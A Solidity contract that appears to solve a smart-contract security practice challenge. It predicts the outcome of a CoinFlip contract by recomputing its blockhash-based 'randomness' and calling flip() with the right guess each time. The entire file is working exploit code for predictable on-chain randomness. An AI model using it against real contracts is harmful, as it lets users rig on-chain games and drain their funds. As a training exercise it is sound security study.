// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinFlipContract = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flipCoin = blockValue / FACTOR;
        bool flipResult = flipCoin == 1 ? true : false;
        coinFlipContract.flip(flipResult);
    }
}
